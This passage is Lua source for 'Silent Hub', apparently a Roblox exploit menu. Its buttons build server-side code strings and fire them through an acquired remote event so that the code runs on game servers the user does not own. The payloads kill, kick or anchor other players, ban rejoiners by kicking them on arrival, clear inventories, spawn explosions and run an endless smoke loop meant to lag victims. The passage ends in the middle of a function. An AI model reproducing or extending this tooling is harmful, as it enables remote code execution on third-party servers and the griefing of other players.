		    Motor6.C0 = CFrame.new(0, 0, 0) * CFrame.Angles(-1.6, 0, -3.1)
		    Motor6.C1 = CFrame.new(0, 0, 0) * CFrame.Angles(-1.6, 0, -3.1)
		        
		end
		
			scale(player.Character, ]] .. input.Text .. [[)
		
		for _,v in pairs(game.Lighting:GetChildren()) do
			if v:IsA('Hat') then
				v.Parent = player.Character
			end
		end
		end
		end
		end
		]]
		else
			code = [[
		local player = game.Players:FindFirstChild("]] .. target .. [[")
		if player and player.Character then
		function scale(chr,scl)
		
			for _,v in pairs(player.Character:GetChildren()) do
				if v:IsA('Hat') then
					v:Clone()
					v.Parent = game.Lighting
				end
			end
				
		    local Head = chr['Head']
		    local Torso = chr['Torso']
		    local LA = chr['Left Arm']
		    local RA = chr['Right Arm']
		    local LL = chr['Left Leg']
		    local RL = chr['Right Leg']
		    local HRP = chr['HumanoidRootPart']
		
		    wait(0.1)
		   
		    Head.formFactor = 3
		    Torso.formFactor = 3
		    LA.formFactor = 3
		    RA.formFactor = 3
		    LL.formFactor = 3
		    RL.formFactor = 3
		    HRP.formFactor = 3
		    
		    Head.Size = Vector3.new(scl * 2, scl, scl)
		    Torso.Size = Vector3.new(scl * 2, scl * 2, scl)
		    LA.Size = Vector3.new(scl, scl * 2, scl)
		    RA.Size = Vector3.new(scl, scl * 2, scl)
		    LL.Size = Vector3.new(scl, scl * 2, scl)
		    RL.Size = Vector3.new(scl, scl * 2, scl)
		    HRP.Size = Vector3.new(scl * 2, scl * 2, scl)
		    
		    local Motor1 = Instance.new('Motor6D', Torso)
		    Motor1.Part0 = Torso
		    Motor1.Part1 = Head
		    Motor1.C0 = CFrame.new(0, 1 * scl, 0) * CFrame.Angles(-1.6, 0, 3.1)
		    Motor1.C1 = CFrame.new(0, -0.5 * scl, 0) * CFrame.Angles(-1.6, 0, 3.1)
		    Motor1.Name = 'Neck'
				    
		    local Motor2 = Instance.new('Motor6D', Torso)
		    Motor2.Part0 = Torso
		    Motor2.Part1 = LA
		    Motor2.C0 = CFrame.new(-1 * scl, 0.5 * scl, 0) * CFrame.Angles(0, -1.6, 0)
		    Motor2.C1 = CFrame.new(0.5 * scl, 0.5 * scl, 0) * CFrame.Angles(0, -1.6, 0)
		    Motor2.Name = 'Left Shoulder'
		    
		    local Motor3 = Instance.new('Motor6D', Torso)
		    Motor3.Part0 = Torso
		    Motor3.Part1 = RA
		    Motor3.C0 = CFrame.new(1 * scl, 0.5 * scl, 0) * CFrame.Angles(0, 1.6, 0)
		    Motor3.C1 = CFrame.new(-0.5 * scl, 0.5 * scl, 0) * CFrame.Angles(0, 1.6, 0)
		    Motor3.Name = 'Right Shoulder'
		    
		    local Motor4 = Instance.new('Motor6D', Torso)
		    Motor4.Part0 = Torso
		    Motor4.Part1 = LL
		    Motor4.C0 = CFrame.new(-1 * scl, -1 * scl, 0) * CFrame.Angles(0, -1.6, 0)
		    Motor4.C1 = CFrame.new(-0.5 * scl, 1 * scl, 0) * CFrame.Angles(0, -1.6, 0)
		    Motor4.Name = 'Left Hip'
		    
		    local Motor5 = Instance.new('Motor6D', Torso)
		    Motor5.Part0 = Torso
		    Motor5.Part1 = RL
		    Motor5.C0 = CFrame.new(1 * scl, -1 * scl, 0) * CFrame.Angles(0, 1.6, 0)
		    Motor5.C1 = CFrame.new(0.5 * scl, 1 * scl, 0) * CFrame.Angles(0, 1.6, 0)
		    Motor5.Name = 'Right Hip'
		    
		    local Motor6 = Instance.new('Motor6D', HRP)
		    Motor6.Part0 = HRP
		    Motor6.Part1 = Torso
		    Motor6.C0 = CFrame.new(0, 0, 0) * CFrame.Angles(-1.6, 0, -3.1)
		    Motor6.C1 = CFrame.new(0, 0, 0) * CFrame.Angles(-1.6, 0, -3.1)
		        
		end
		
			scale(player.Character, ]] .. input.Text .. [[)
		
		for _,v in pairs(game.Lighting:GetChildren()) do
			if v:IsA('Hat') then
				v.Parent = player.Character
			end
		end
		end
		]]
		end
	
		if remote:IsA("RemoteEvent") then
			remote:FireServer(code)
		elseif remote:IsA("RemoteFunction") then
			remote:InvokeServer(code)
		end
	end
	
	button.MouseButton1Click:Connect(click)
end;
task.spawn(C_28);
-- StarterGui.Silent Hub.Main.MainContainer.Pages.Players.Main.Dependent.Button.LocalScript
local function C_2b()
local script = G2L["2b"];
	local button = script.Parent
	local value = button.Parent.Parent.Parent.Parent.Parent.Parent.Parent.AcquiredRemote
	local playerinput = button.Parent.Parent.Parent.Main.PlayerName
	local input = button.Parent.Parent.Parent.Main.Input
	
	local function click()
		local path = value.Value
	
		if not path or path == "" then
			warn("Silent Hub: No remote path acquired yet!")
			return
		end
	
		local remote = game
		for segment in path:gmatch("[^.]+") do
			remote = remote[segment]
		end
	
		if not remote then
			return
		end
		
		local text = input.Text:gsub('"', '\\"'):gsub("\n", "\\n")
	
		local target = playerinput.Text
	
		local code
	
		if target:lower() == "all" then
			code = [[
		for _, player in ipairs(game.Players:GetPlayers()) do
			if player.Character then
				player.Character.Humanoid.MaxHealth = ]] .. text .. [[
				player.Character.Humanoid.Health = ]] .. text .. [[
			end
		end
		]]
		elseif target:lower() == "others" then
			code = [[
		local sender = ]] .. game.Players.LocalPlayer .. [[
		for _, player in ipairs(game.Players:GetPlayers()) do
			if player ~= sender and player.Character then
						player.Character.Humanoid.MaxHealth = ]] .. text .. [[
				player.Character.Humanoid.Health = ]] .. text .. [[
			end
		end
		]]
		else
			code = [[
		local player = game.Players:FindFirstChild("]] .. target .. [[")
		if player and player.Character then
					player.Character.Humanoid.MaxHealth = ]] .. text .. [[
				player.Character.Humanoid.Health = ]] .. text .. [[
		end
		]]
		end
	
		if remote:IsA("RemoteEvent") then
			remote:FireServer(code)
		elseif remote:IsA("RemoteFunction") then
			remote:InvokeServer(code)
		end
	end
	
	button.MouseButton1Click:Connect(click)
end;
task.spawn(C_2b);
-- StarterGui.Silent Hub.Main.MainContainer.Pages.Players.Main.Dependent.Button.LocalScript
local function C_2e()
local script = G2L["2e"];
	local button = script.Parent
	local value = button.Parent.Parent.Parent.Parent.Parent.Parent.Parent.AcquiredRemote
	local playerinput = button.Parent.Parent.Parent.Main.PlayerName
	local input = button.Parent.Parent.Parent.Main.Input
	
	local function click()
		local path = value.Value
	
		if not path or path == "" then
			warn("Silent Hub: No remote path acquired yet!")
			return
		end
	
		local remote = game
		for segment in path:gmatch("[^.]+") do
			remote = remote[segment]
		end
	
		if not remote then
			return
		end
		
		local text = input.Text:gsub('"', '\\"'):gsub("\n", "\\n")
	
		local target = playerinput.Text
	
		local code
	
		if target:lower() == "all" then
			code = [[
		for _, player in ipairs(game.Players:GetPlayers()) do
			if player.Character then
				local t = Instance.new("Team")
				t.Name = "]] .. text .. [["
				t.TeamColor = BrickColor.random()
				t.Parent = game.Teams
				player.Team = t
			end
		end
		]]
		elseif target:lower() == "others" then
			code = [[
		local sender = ]] .. game.Players.LocalPlayer .. [[
		for _, player in ipairs(game.Players:GetPlayers()) do
			if player ~= sender and player.Character then
					local t = Instance.new("Team")
				t.Name = "]] .. text .. [["
				t.TeamColor = BrickColor.random()
				t.Parent = game.Teams
				player.Team = t
			end
		end
		]]
		else
			code = [[
		local player = game.Players:FindFirstChild("]] .. target .. [[")
		if player and player.Character then
					local t = Instance.new("Team")
				t.Name = "]] .. text .. [["
				t.TeamColor = BrickColor.random()
				t.Parent = game.Teams
				player.Team = t
		end
		]]
		end
	
		if remote:IsA("RemoteEvent") then
			remote:FireServer(code)
		elseif remote:IsA("RemoteFunction") then
			remote:InvokeServer(code)
		end
	end
	
	button.MouseButton1Click:Connect(click)
end;
task.spawn(C_2e);
-- StarterGui.Silent Hub.Main.MainContainer.Pages.Players.Independent.Button.LocalScript
local function C_32()
local script = G2L["32"];
	local button = script.Parent
	local value = button.Parent.Parent.Parent.Parent.Parent.Parent.AcquiredRemote
	local playerinput = button.Parent.Parent.Main.PlayerName
	--local input = button.Parent.Parent.Main.Input
	
	local function click()
		local path = value.Value
	
		if not path or path == "" then
			warn("Silent Hub: No remote path acquired yet!")
			return
		end
	
		local remote = game
		for segment in path:gmatch("[^.]+") do
			remote = remote[segment]
		end
	
		if not remote then
			return
		end
	
		local target = playerinput.Text
	
		local code
	
		if target:lower() == "all" then
			code = [[
		for _, player in ipairs(game.Players:GetPlayers()) do
			player:Kick()
		end
		]]
		elseif target:lower() == "others" then
			code = [[
		local sender = ]] .. game.Players.LocalPlayer .. [[
		for _, player in ipairs(game.Players:GetPlayers()) do
			if player ~= sender then
				player:Kick()
			end
		end
		]]
		else
			code = [[
		local player = game.Players:FindFirstChild("]] .. target .. [[")
		if player then
		player:Kick()
		end
		]]
		end
	
		if remote:IsA("RemoteEvent") then
			remote:FireServer(code)
		elseif remote:IsA("RemoteFunction") then
			remote:InvokeServer(code)
		end
	end
	
	button.MouseButton1Click:Connect(click)
end;
task.spawn(C_32);
-- StarterGui.Silent Hub.Main.MainContainer.Pages.Players.Independent.Button.LocalScript
local function C_36()
local script = G2L["36"];
	local button = script.Parent
	local value = button.Parent.Parent.Parent.Parent.Parent.Parent.AcquiredRemote
	local playerinput = button.Parent.Parent.Main.PlayerName
	--local input = button.Parent.Parent.Main.Input
	
	local function click()
		local path = value.Value
	
		if not path or path == "" then
			warn("Silent Hub: No remote path acquired yet!")
			return
		end
	
		local remote = game
		for segment in path:gmatch("[^.]+") do
			remote = remote[segment]
		end
	
		if not remote then
			return
		end
	
		local target = playerinput.Text
	
		local code
	
		if target:lower() == "all" then
			code = [[
		for _, player in ipairs(game.Players:GetPlayers()) do
			player:Kick()
		end
		]]
		elseif target:lower() == "others" then
			code = [[
		local sender = ]] .. game.Players.LocalPlayer .. [[
		for _, player in ipairs(game.Players:GetPlayers()) do
			if player ~= sender then
				player:Kick()
				
				game.Players.PlayerAdded:Connect(function(player)
					player:Kick()
				end)
			end
		end
		]]
		else
			code = [[
		local player = game.Players:FindFirstChild("]] .. target .. [[")
		if player then
		player:Kick()
		game.Players.PlayerAdded:Connect(function(player)
					player:Kick()
				end)
			end
		end
		]]
		end
	
		if remote:IsA("RemoteEvent") then
			remote:FireServer(code)
		elseif remote:IsA("RemoteFunction") then
			remote:InvokeServer(code)
		end
	end
	
	button.MouseButton1Click:Connect(click)
end;
task.spawn(C_36);
-- StarterGui.Silent Hub.Main.MainContainer.Pages.Players.Independent.Button.LocalScript
local function C_39()
local script = G2L["39"];
	local button = script.Parent
	local value = button.Parent.Parent.Parent.Parent.Parent.Parent.AcquiredRemote
	local playerinput = button.Parent.Parent.Main.PlayerName
	--local input = button.Parent.Parent.Main.Input
	
	local function click()
		local path = value.Value
	
		if not path or path == "" then
			warn("Silent Hub: No remote path acquired yet!")
			return
		end
	
		local remote = game
		for segment in path:gmatch("[^.]+") do
			remote = remote[segment]
		end
	
		if not remote then
			return
		end
	
		local target = playerinput.Text
	
		local code
	
		if target:lower() == "all" then
			code = [[
		for _, player in ipairs(game.Players:GetPlayers()) do
			if player.Character then
				player.Character.Humanoid.Health = -math.huge
			end
		end
		]]
		elseif target:lower() == "others" then
			code = [[
		local sender = ]] .. game.Players.LocalPlayer .. [[
		for _, player in ipairs(game.Players:GetPlayers()) do
			if player ~= sender and player.Character then
				player.Character.Humanoid.Health = -math.huge
			end
		end
		]]
		else
			code = [[
		local player = game.Players:FindFirstChild("]] .. target .. [[")
		if player and player.Character then
			player.Character.Humanoid.Health = -math.huge
		end
		]]
		end
	
		if remote:IsA("RemoteEvent") then
			remote:FireServer(code)
		elseif remote:IsA("RemoteFunction") then
			remote:InvokeServer(code)
		end
	end
	
	button.MouseButton1Click:Connect(click)
end;
task.spawn(C_39);
-- StarterGui.Silent Hub.Main.MainContainer.Pages.Players.Independent.Button.LocalScript
local function C_3c()
local script = G2L["3c"];
	local button = script.Parent
	local value = button.Parent.Parent.Parent.Parent.Parent.Parent.AcquiredRemote
	local playerinput = button.Parent.Parent.Main.PlayerName
	--local input = button.Parent.Parent.Main.Input
	
	local function click()
		local path = value.Value
	
		if not path or path == "" then
			warn("Silent Hub: No remote path acquired yet!")
			return
		end
	
		local remote = game
		for segment in path:gmatch("[^.]+") do
			remote = remote[segment]
		end
	
		if not remote then
			return
		end
	
		local target = playerinput.Text
	
		local code
	
		if target:lower() == "all" then
			code = [[
		for _, player in ipairs(game.Players:GetPlayers()) do
			if player.Character then
					local explosion = Instance.new("Explosion")
				explosion.Position = player.Character.HumanoidRootPart.Position
				explosion.Parent = workspace
			end
		end
		]]
		elseif target:lower() == "others" then
			code = [[
		local sender = ]] .. game.Players.LocalPlayer .. [[
		for _, player in ipairs(game.Players:GetPlayers()) do
			if player ~= sender and player.Character then
				local explosion = Instance.new("Explosion")
				explosion.Position = player.Character.HumanoidRootPart.Position
				explosion.Parent = workspace
			end
		end
		]]
		else
			code = [[
		local player = game.Players:FindFirstChild("]] .. target .. [[")
		if player and player.Character then
			local explosion = Instance.new("Explosion")
				explosion.Position = player.Character.HumanoidRootPart.Position
				explosion.Parent = workspace
		end
		]]
		end
	
		if remote:IsA("RemoteEvent") then
			remote:FireServer(code)
		elseif remote:IsA("RemoteFunction") then
			remote:InvokeServer(code)
		end
	end
	
	button.MouseButton1Click:Connect(click)
end;
task.spawn(C_3c);
-- StarterGui.Silent Hub.Main.MainContainer.Pages.Players.Independent.Button.LocalScript
local function C_3f()
local script = G2L["3f"];
	local button = script.Parent
	local value = button.Parent.Parent.Parent.Parent.Parent.Parent.AcquiredRemote
	local playerinput = button.Parent.Parent.Main.PlayerName
	--local input = button.Parent.Parent.Main.Input
	
	local function click()
		local path = value.Value
	
		if not path or path == "" then
			warn("Silent Hub: No remote path acquired yet!")
			return
		end
	
		local remote = game
		for segment in path:gmatch("[^.]+") do
			remote = remote[segment]
		end
	
		if not remote then
			return
		end
	
		local target = playerinput.Text
	
		local code
	
		if target:lower() == "all" then
			code = [[
		for _, player in ipairs(game.Players:GetPlayers()) do
			if player.Character then
				local f = Instance.new("Fire")
				f.Parent = player.Character.HumanoidRootPart
			end
		end
		]]
		elseif target:lower() == "others" then
			code = [[
		local sender = ]] .. game.Players.LocalPlayer .. [[
		for _, player in ipairs(game.Players:GetPlayers()) do
			if player ~= sender and player.Character then
				local f = Instance.new("Fire")
				f.Parent = player.Character.HumanoidRootPart
			end
		end
		]]
		else
			code = [[
		local player = game.Players:FindFirstChild("]] .. target .. [[")
		if player and player.Character then
			local f = Instance.new("Fire")
				f.Parent = player.Character.HumanoidRootPart
		end
		]]
		end
	
		if remote:IsA("RemoteEvent") then
			remote:FireServer(code)
		elseif remote:IsA("RemoteFunction") then
			remote:InvokeServer(code)
		end
	end
	
	button.MouseButton1Click:Connect(click)
end;
task.spawn(C_3f);
-- StarterGui.Silent Hub.Main.MainContainer.Pages.Players.Independent.Button.LocalScript
local function C_42()
local script = G2L["42"];
	local button = script.Parent
	local value = button.Parent.Parent.Parent.Parent.Parent.Parent.AcquiredRemote
	local playerinput = button.Parent.Parent.Main.PlayerName
	--local input = button.Parent.Parent.Main.Input
	
	local function click()
		local path = value.Value
	
		if not path or path == "" then
			warn("Silent Hub: No remote path acquired yet!")
			return
		end
	
		local remote = game
		for segment in path:gmatch("[^.]+") do
			remote = remote[segment]
		end
	
		if not remote then
			return
		end
	
		local target = playerinput.Text
	
		local code
	
		if target:lower() == "all" then
			code = [[
		for _, player in ipairs(game.Players:GetPlayers()) do
			if player.Character then
				local f = Instance.new("Sparkles")
				f.Parent = player.Character.HumanoidRootPart
			end
		end
		]]
		elseif target:lower() == "others" then
			code = [[
		local sender = ]] .. game.Players.LocalPlayer .. [[
		for _, player in ipairs(game.Players:GetPlayers()) do
			if player ~= sender and player.Character then
				local f = Instance.new("Sparkles")
				f.Parent = player.Character.HumanoidRootPart
			end
		end
		]]
		else
			code = [[
		local player = game.Players:FindFirstChild("]] .. target .. [[")
		if player and player.Character then
			local f = Instance.new("Sparkles")
				f.Parent = player.Character.HumanoidRootPart
		end
		]]
		end
	
		if remote:IsA("RemoteEvent") then
			remote:FireServer(code)
		elseif remote:IsA("RemoteFunction") then
			remote:InvokeServer(code)
		end
	end
	
	button.MouseButton1Click:Connect(click)
end;
task.spawn(C_42);
-- StarterGui.Silent Hub.Main.MainContainer.Pages.Players.Independent.Button.LocalScript
local function C_45()
local script = G2L["45"];
	local button = script.Parent
	local value = button.Parent.Parent.Parent.Parent.Parent.Parent.AcquiredRemote
	local playerinput = button.Parent.Parent.Main.PlayerName
	--local input = button.Parent.Parent.Main.Input
	
	local function click()
		local path = value.Value
	
		if not path or path == "" then
			warn("Silent Hub: No remote path acquired yet!")
			return
		end
	
		local remote = game
		for segment in path:gmatch("[^.]+") do
			remote = remote[segment]
		end
	
		if not remote then
			return
		end
	
		local target = playerinput.Text
	
		local code
	
		if target:lower() == "all" then
			code = [[
		for _, player in ipairs(game.Players:GetPlayers()) do
			if player.Character then
				Instance.new("ForceField").Parent = player.Character
			end
		end
		]]
		elseif target:lower() == "others" then
			code = [[
		local sender = ]] .. game.Players.LocalPlayer .. [[
		for _, player in ipairs(game.Players:GetPlayers()) do
			if player ~= sender and player.Character then
					Instance.new("ForceField").Parent = player.Character
			end
		end
		]]
		else
			code = [[
		local player = game.Players:FindFirstChild("]] .. target .. [[")
		if player and player.Character then
			Instance.new("ForceField").Parent = player.Character
		end
		]]
		end
	
		if remote:IsA("RemoteEvent") then
			remote:FireServer(code)
		elseif remote:IsA("RemoteFunction") then
			remote:InvokeServer(code)
		end
	end
	
	button.MouseButton1Click:Connect(click)
end;
task.spawn(C_45);
-- StarterGui.Silent Hub.Main.MainContainer.Pages.Players.Independent.Button.LocalScript
local function C_48()
local script = G2L["48"];
	local button = script.Parent
	local value = button.Parent.Parent.Parent.Parent.Parent.Parent.AcquiredRemote
	local playerinput = button.Parent.Parent.Main.PlayerName
	--local input = button.Parent.Parent.Main.Input
	
	local function click()
		local path = value.Value
	
		if not path or path == "" then
			warn("Silent Hub: No remote path acquired yet!")
			return
		end
	
		local remote = game
		for segment in path:gmatch("[^.]+") do
			remote = remote[segment]
		end
	
		if not remote then
			return
		end
	
		local target = playerinput.Text
	
		local code
	
		if target:lower() == "all" then
			code = [[
		for _, player in ipairs(game.Players:GetPlayers()) do
			if player.Character then
				for _, v in pairs(player.Character:GetDescendants()) do
				if v:IsA("ForceField") then
					v:Destroy()
				end
				end
			end
		end
		]]
		elseif target:lower() == "others" then
			code = [[
		local sender = ]] .. game.Players.LocalPlayer .. [[
		for _, player in ipairs(game.Players:GetPlayers()) do
			if player ~= sender and player.Character then
				for _, v in pairs(player.Character:GetDescendants()) do
				if v:IsA("ForceField") then
					v:Destroy()
				end
				end
			end
		end
		]]
		else
			code = [[
		local player = game.Players:FindFirstChild("]] .. target .. [[")
		if player and player.Character then
			for _, v in pairs(player.Character:GetDescendants()) do
				if v:IsA("ForceField") then
					v:Destroy()
				end
				end
		end
		]]
		end
	
		if remote:IsA("RemoteEvent") then
			remote:FireServer(code)
		elseif remote:IsA("RemoteFunction") then
			remote:InvokeServer(code)
		end
	end
	
	button.MouseButton1Click:Connect(click)
end;
task.spawn(C_48);
-- StarterGui.Silent Hub.Main.MainContainer.Pages.Players.Independent.Button.LocalScript
local function C_4b()
local script = G2L["4b"];
	local button = script.Parent
	local value = button.Parent.Parent.Parent.Parent.Parent.Parent.AcquiredRemote
	local playerinput = button.Parent.Parent.Main.PlayerName
	--local input = button.Parent.Parent.Main.Input
	
	local function click()
		local path = value.Value
	
		if not path or path == "" then
			warn("Silent Hub: No remote path acquired yet!")
			return
		end
	
		local remote = game
		for segment in path:gmatch("[^.]+") do
			remote = remote[segment]
		end
	
		if not remote then
			return
		end
	
		local target = playerinput.Text
	
		local code
	
		if target:lower() == "all" then
			code = [[
		for _, player in ipairs(game.Players:GetPlayers()) do
			if player.Character then
					player.Character.HumanoidRootPart.Anchored = true
			end
		end
		]]
		elseif target:lower() == "others" then
			code = [[
		local sender = ]] .. game.Players.LocalPlayer .. [[
		for _, player in ipairs(game.Players:GetPlayers()) do
			if player ~= sender and player.Character then
				player.Character.HumanoidRootPart.Anchored = true
			end
		end
		]]
		else
			code = [[
		local player = game.Players:FindFirstChild("]] .. target .. [[")
		if player and player.Character then
			player.Character.HumanoidRootPart.Anchored = true
		end
		]]
		end
	
		if remote:IsA("RemoteEvent") then
			remote:FireServer(code)
		elseif remote:IsA("RemoteFunction") then
			remote:InvokeServer(code)
		end
	end
	
	button.MouseButton1Click:Connect(click)
end;
task.spawn(C_4b);
-- StarterGui.Silent Hub.Main.MainContainer.Pages.Players.Independent.Button.LocalScript
local function C_4e()
local script = G2L["4e"];
	local button = script.Parent
	local value = button.Parent.Parent.Parent.Parent.Parent.Parent.AcquiredRemote
	local playerinput = button.Parent.Parent.Main.PlayerName
	--local input = button.Parent.Parent.Main.Input
	
	local function click()
		local path = value.Value
	
		if not path or path == "" then
			warn("Silent Hub: No remote path acquired yet!")
			return
		end
	
		local remote = game
		for segment in path:gmatch("[^.]+") do
			remote = remote[segment]
		end
	
		if not remote then
			return
		end
	
		local target = playerinput.Text
	
		local code
	
		if target:lower() == "all" then
			code = [[
		for _, player in ipairs(game.Players:GetPlayers()) do
			if player.Character then
					player.Character.HumanoidRootPart.Anchored = false
			end
		end
		]]
		elseif target:lower() == "others" then
			code = [[
		local sender = ]] .. game.Players.LocalPlayer .. [[
		for _, player in ipairs(game.Players:GetPlayers()) do
			if player ~= sender and player.Character then
				player.Character.HumanoidRootPart.Anchored = false
			end
		end
		]]
		else
			code = [[
		local player = game.Players:FindFirstChild("]] .. target .. [[")
		if player and player.Character then
			player.Character.HumanoidRootPart.Anchored = false
		end
		]]
		end
	
		if remote:IsA("RemoteEvent") then
			remote:FireServer(code)
		elseif remote:IsA("RemoteFunction") then
			remote:InvokeServer(code)
		end
	end
	
	button.MouseButton1Click:Connect(click)
end;
task.spawn(C_4e);
-- StarterGui.Silent Hub.Main.MainContainer.Pages.Players.Independent.Button.LocalScript
local function C_51()
local script = G2L["51"];
	local button = script.Parent
	local value = button.Parent.Parent.Parent.Parent.Parent.Parent.Parent.AcquiredRemote
	local playerinput = button.Parent.Parent.Parent.Main.PlayerName
	local input = button.Parent.Parent.Parent.Main.Input
	
	local function click()
		local path = value.Value
	
		if not path or path == "" then
			warn("Silent Hub: No remote path acquired yet!")
			return
		end
	
		local remote = game
		for segment in path:gmatch("[^.]+") do
			remote = remote[segment]
		end
	
		if not remote then
			return
		end
	
		local text = input.Text:gsub('"', '\\"'):gsub("\n", "\\n")
	
		local target = playerinput.Text
	
		local code
	
		if target:lower() == "all" then
			code = [[
		for _, player in ipairs(game.Players:GetPlayers()) do
			if player.Character then
				player.Backpack:ClearAllChildren()
			end
		end
		]]
		elseif target:lower() == "others" then
			code = [[
		local sender = ]] .. game.Players.LocalPlayer .. [[
		for _, player in ipairs(game.Players:GetPlayers()) do
			if player ~= sender and player.Character then
				player.Backpack:ClearAllChildren()
			end
		end
		]]
		else
			code = [[
		local player = game.Players:FindFirstChild("]] .. target .. [[")
		if player and player.Character then
			player.Backpack:ClearAllChildren()
		end
		]]
		end
	
	
		if remote:IsA("RemoteEvent") then
			remote:FireServer(code)
		elseif remote:IsA("RemoteFunction") then
			remote:InvokeServer(code)
		end
	end
	
	button.MouseButton1Click:Connect(click)
end;
task.spawn(C_51);
-- StarterGui.Silent Hub.Main.MainContainer.Pages.Players.Independent.Button.LocalScript
local function C_54()
local script = G2L["54"];
	local button = script.Parent
	local value = button.Parent.Parent.Parent.Parent.Parent.Parent.AcquiredRemote
	local playerinput = button.Parent.Parent.Main.PlayerName
	--local input = button.Parent.Parent.Main.Input
	
	local function click()
		local path = value.Value
	
		if not path or path == "" then
			warn("Silent Hub: No remote path acquired yet!")
			return
		end
	
		local remote = game
		for segment in path:gmatch("[^.]+") do
			remote = remote[segment]
		end
	
		if not remote then
			return
		end
	
		local target = playerinput.Text
	
		local code
	
		if target:lower() == "all" then
			code = [[
		for _, player in ipairs(game.Players:GetPlayers()) do
			if player.Character then
				local f = Instance.new("Smoke")
				f.Parent = player.Character.HumanoidRootPart
			end
		end
		]]
		elseif target:lower() == "others" then
			code = [[
		local sender = ]] .. game.Players.LocalPlayer .. [[
		for _, player in ipairs(game.Players:GetPlayers()) do
			if player ~= sender and player.Character then
				local f = Instance.new("Smoke")
				f.Parent = player.Character.HumanoidRootPart
			end
		end
		]]
		else
			code = [[
		local player = game.Players:FindFirstChild("]] .. target .. [[")
		if player and player.Character then
			local f = Instance.new("Smoke")
				f.Parent = player.Character.HumanoidRootPart
		end
		]]
		end
	
		if remote:IsA("RemoteEvent") then
			remote:FireServer(code)
		elseif remote:IsA("RemoteFunction") then
			remote:InvokeServer(code)
		end
	end
	
	button.MouseButton1Click:Connect(click)
end;
task.spawn(C_54);
-- StarterGui.Silent Hub.Main.MainContainer.Pages.Players.Independent.Button.LocalScript
local function C_57()
local script = G2L["57"];
	local button = script.Parent
	local value = button.Parent.Parent.Parent.Parent.Parent.Parent.AcquiredRemote
	local playerinput = button.Parent.Parent.Main.PlayerName
	--local input = button.Parent.Parent.Main.Input
	
	local function click()
		local path = value.Value
	
		if not path or path == "" then
			warn("Silent Hub: No remote path acquired yet!")
			return
		end
	
		local remote = game
		for segment in path:gmatch("[^.]+") do
			remote = remote[segment]
		end
	
		if not remote then
			return
		end
	
		local target = playerinput.Text
	
		local code
	
		if target:lower() == "all" then
			code = [[
		for _, player in ipairs(game.Players:GetPlayers()) do
			if player.Character then
				player.Character.HumanoidRootPart.Anchored = true
				player.CameraMode = Enum.CameraMode.LockFirstPerson
				while wait(0) do
					local smoke = Instance.new("Smoke")
					smoke.Parent = player.Character.HumanoidRootPart
					local smoke2 = Instance.new("Smoke")
					smoke2.Parent = player.Character.HumanoidRootPart
					local smoke3 = Instance.new("Smoke")
					smoke3.Parent = player.Character.HumanoidRootPart
					local smoke4 = Instance.new("Smoke")
					smoke4.Parent = player.Character.HumanoidRootPart
					local smoke5 = Instance.new("Smoke")
					smoke5.Parent = player.Character.HumanoidRootPart
					local smoke6 = Instance.new("Smoke")
					smoke6.Parent = player.Character.HumanoidRootPart
					local smoke7 = Instance.new("Smoke")
					smoke7.Parent = player.Character.HumanoidRootPart
					local smoke8 = Instance.new("Smoke")
					smoke8.Parent = player.Character.HumanoidRootPart
					local smoke9 = Instance.new("Smoke")
					smoke9.Parent = player.Character.HumanoidRootPart
					local smoke10 = Instance.new("Smoke")
					smoke10.Parent = player.Character.HumanoidRootPart
					local smoke11 = Instance.new("Smoke")
					smoke11.Parent = player.Character.HumanoidRootPart
					local smoke12 = Instance.new("Smoke")
					smoke12.Parent = player.Character.HumanoidRootPart
				end
			end
		end
		]]
		elseif target:lower() == "others" then
			code = [[
		local sender = ]] .. game.Players.LocalPlayer .. [[
		for _, player in ipairs(game.Players:GetPlayers()) do
			if player ~= sender and player.Character then
					player.Character.HumanoidRootPart.Anchored = true
				player.CameraMode = Enum.CameraMode.LockFirstPerson
				while wait(0) do
					local smoke = Instance.new("Smoke")
					smoke.Parent = player.Character.HumanoidRootPart
					local smoke2 = Instance.new("Smoke")
					smoke2.Parent = player.Character.HumanoidRootPart
					local smoke3 = Instance.new("Smoke")
					smoke3.Parent = player.Character.HumanoidRootPart
					local smoke4 = Instance.new("Smoke")
					smoke4.Parent = player.Character.HumanoidRootPart
					local smoke5 = Instance.new("Smoke")
					smoke5.Parent = player.Character.HumanoidRootPart
					local smoke6 = Instance.new("Smoke")
					smoke6.Parent = player.Character.HumanoidRootPart
					local smoke7 = Instance.new("Smoke")
					smoke7.Parent = player.Character.HumanoidRootPart
					local smoke8 = Instance.new("Smoke")
					smoke8.Parent = player.Character.HumanoidRootPart
					local smoke9 = Instance.new("Smoke")
					smoke9.Parent = player.Character.HumanoidRootPart
					local smoke10 = Instance.new("Smoke")
					smoke10.Parent = player.Character.HumanoidRootPart
					local smoke11 = Instance.new("Smoke")
					smoke11.Parent = player.Character.HumanoidRootPart
					local smoke12 = Instance.new("Smoke")
					smoke12.Parent = player.Character.HumanoidRootPart
				end
			end
		end
		]]
		else
			code = [[
		local player = game.Players:FindFirstChild("]] .. target .. [[")
		if player and player.Character then
			player.Character.HumanoidRootPart.Anchored = true
				player.CameraMode = Enum.CameraMode.LockFirstPerson
				while wait(0) do
					local smoke = Instance.new("Smoke")
					smoke.Parent = player.Character.HumanoidRootPart
					local smoke2 = Instance.new("Smoke")
					smoke2.Parent = player.Character.HumanoidRootPart
					local smoke3 = Instance.new("Smoke")
					smoke3.Parent = player.Character.HumanoidRootPart
					local smoke4 = Instance.new("Smoke")
					smoke4.Parent = player.Character.HumanoidRootPart
					local smoke5 = Instance.new("Smoke")
					smoke5.Parent = player.Character.HumanoidRootPart
					local smoke6 = Instance.new("Smoke")
					smoke6.Parent = player.Character.HumanoidRootPart
					local smoke7 = Instance.new("Smoke")
					smoke7.Parent = player.Character.HumanoidRootPart
					local smoke8 = Instance.new("Smoke")
					smoke8.Parent = player.Character.HumanoidRootPart
					local smoke9 = Instance.new("Smoke")
					smoke9.Parent = player.Character.HumanoidRootPart
					local smoke10 = Instance.new("Smoke")
					smoke10.Parent = player.Character.HumanoidRootPart
					local smoke11 = Instance.new("Smoke")
					smoke11.Parent = player.Character.HumanoidRootPart
					local smoke12 = Instance.new("Smoke")
					smoke12.Parent = player.Character.HumanoidRootPart
				end
		end
		]]
		end
	
		if remote:IsA("RemoteEvent") then
			remote:FireServer(code)
		elseif remote:IsA("RemoteFunction") then
			remote:InvokeServer(code)
		end
	end
	
	button.MouseButton1Click:Connect(click)
end;
task.spawn(C_57);
-- StarterGui.Silent Hub.Main.MainContainer.Pages.Players.Independent.Button.LocalScript
local function C_5a()
local script = G2L["5a"];
	local button = script.Parent
